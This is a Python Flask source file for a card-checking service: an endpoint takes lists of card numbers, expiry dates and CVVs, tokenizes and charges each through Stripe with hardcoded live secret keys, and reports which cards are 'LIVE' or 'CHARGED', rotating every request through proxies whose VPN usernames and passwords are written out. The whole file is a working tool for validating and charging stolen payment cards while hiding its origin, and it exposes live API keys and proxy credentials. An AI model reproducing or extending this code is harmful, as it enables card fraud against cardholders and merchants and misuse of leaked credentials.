import time
import requests
from flask import Flask, request, jsonify
import json
import random

app = Flask(__name__)

# List of proxies
proxies_list = [
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-vn.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-nl.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ph.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-pt.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-rs.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-sg.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-in.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-jp.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-kr.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-lt.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-md.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ng.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-fi.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-hk.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-be.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ca.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ch.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-cl.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-de.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-at.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-au.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-be.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ca.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ch.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-cl.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-de.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-fi.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-hk.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-in.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-jp.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-kr.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-lt.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-md.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ng.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-nl.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ph.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-pt.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-rs.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-sg.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-vn.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-at.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-au.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-be.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ca.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ch.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-cl.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-de.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-fi.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-hk.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-in.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-jp.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-kr.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-lt.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-md.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ng.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-nl.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-ph.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-pt.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-rs.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-sg.pointtoserver.com:10799",
    "http://purevpn0s13843524:R7bCaMB2kmplpo@prox-vn.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-at.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-au.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-be.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ca.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ch.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-cl.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-de.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-fi.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-hk.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-in.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-jp.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-kr.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-lt.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-md.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ng.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-nl.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-ph.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-pt.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-rs.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-sg.pointtoserver.com:10799",
    "http://purevpn0s13830845:6phsLWXBQEq4MR@prox-vn.pointtoserver.com:10799"
]

def get_random_proxy():
    proxy = random.choice(proxies_list)
    return {
        "http": proxy,
        "https": proxy
    }

@app.route('/api', methods=['GET'])
def api():
    start_time = time.time()

    cards = request.args.get("lista", "")
    mode = request.args.get("mode", "cvv")
    amount = int(request.args.get("amount", 1))
    currency = request.args.get("currency", "usd")

    if not cards:
        return "Please enter card details", 400

    card_list = cards.split(",")
    results = []

    pk = 'pk_live_51PaJPbGidpxNBSmxo9buVp72fLCnjrQX05EqDl81kQtYbx81y10rnLiQIC1QT9KNhBIlbXlw6oiSBuWW1SFCu68V00R4sfLJ2Z'
    sk = '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'

    for card in card_list:
        split = card.split("|")
        cc = split[0] if len(split) > 0 else ''
        mes = split[1] if len(split) > 1 else ''
        ano = split[2] if len(split) > 2 else ''
        cvv = split[3] if len(split) > 3 else ''

        if not cc or not mes or not ano or not cvv:
            results.append(f"Invalid card details for {card}")
            continue

        token_data = {
            'card[number]': cc,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'card[cvc]': cvv
        }

        # Get a random proxy
        proxies = get_random_proxy()

        response = requests.post(
            'https://api.stripe.com/v1/tokens',
            data=token_data,
            headers={
                'Authorization': f'Bearer {pk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            proxies=proxies
        )

        if response.status_code != 200:
            results.append(f"Error: {response.json().get('error', {}).get('message', 'Unknown error')} for {card}")
            continue

        token_data = response.json()
        token_id = token_data.get('id', '')

        if not token_id:
            results.append(f"Token creation failed for {card}")
            continue

        charge_data = {
            'amount': amount * 100,
            'currency': currency,
            'source': token_id,
            'description': 'Charge for product/service'
        }

        # Get a random proxy
        proxies = get_random_proxy()

        response = requests.post(
            'https://api.stripe.com/v1/charges',
            data=charge_data,
            headers={
                'Authorization': f'Bearer {sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            proxies=proxies
        )

        chares = response.json()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        if response.status_code == 200 and chares.get('status') == "succeeded":
            status = "CHARGED"
            resp = "Charged successfully ✅"
        elif "Your card's security code is incorrect." in json.dumps(chares):
            status = "LIVE"
            resp = "CCN LIVE✅"
        elif 'insufficient funds' in json.dumps(chares) or 'Insufficient Funds' in json.dumps(chares):
            status = "LIVE"
            resp = "Insufficient funds✅"
        else:
            status = "Declined ❌"
            resp = chares.get('error', {}).get('decline_code', chares.get('error', {}).get('message', 'Unknown error'))

        results.append(f"{status} --> {card} --> [{resp}]")

    return "<br>".join(results), 200


@app.route('/test_proxy', methods=['GET'])
def test_proxy():
    try:
        # Get a random proxy from the list
        proxies = get_random_proxy()

        # Test a simple request using the random proxy
        response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=10)
        
        # Return the response from the test
        return jsonify({
            "proxy_used": proxies,
            "response": response.json()
        }), response.status_code
    except Exception as e:
        # Return error if the proxy fails
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
